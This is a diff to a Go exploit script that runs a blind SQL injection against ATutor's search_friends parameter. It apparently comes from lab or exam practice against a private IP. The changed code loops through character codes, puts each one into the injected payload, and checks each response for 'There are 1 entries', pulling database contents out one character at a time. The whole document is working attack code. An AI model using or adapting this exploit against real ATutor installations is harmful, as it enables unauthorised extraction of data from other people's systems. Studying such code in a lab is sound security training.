@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"regexp"
 	"strings"
 )
 
@@ -22,12 +23,22 @@ func sendSearchFriendsSQLiExtra(ip string, sqliPayload string) int {
 	for i := 32; i < 126; i++ {
 		// do necessary URL manipulation
 		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
-		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)
+		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?search_friends=%s", ip, updatedPayload)
 
 		// send the request
-		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength
+		//contentLength := utils.SendGetRequest(client, true, requestURL).ContentLength
+		//if contentLength > 28728 {
+		//	return i
+		//}
 
-		if contentLength > 0 {
+		// **** for some reason, the content length does not return properly when the proxy is not used
+		// **** when the proxy is used, the content length varies due to randkey changes between true/false requests
+		// **** so we will use regex instead to be more certain
+
+		// regex
+		response := utils.SendGetRequest(client, false, requestURL)
+		match, _ := regexp.MatchString("There are 1 entries", response.ResponseBody)
+		if match {
 			return i
 		}
 	}
@@ -44,8 +55,8 @@ func main() {
 	args := os.Args[:]
 	log.Println("Args: ", args)
 
-	if len(args) != 2 {
-		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
+	if len(args) < 2 {
+		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy] <target>", os.Args[0]))
 		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
 		os.Exit(1)
 	}
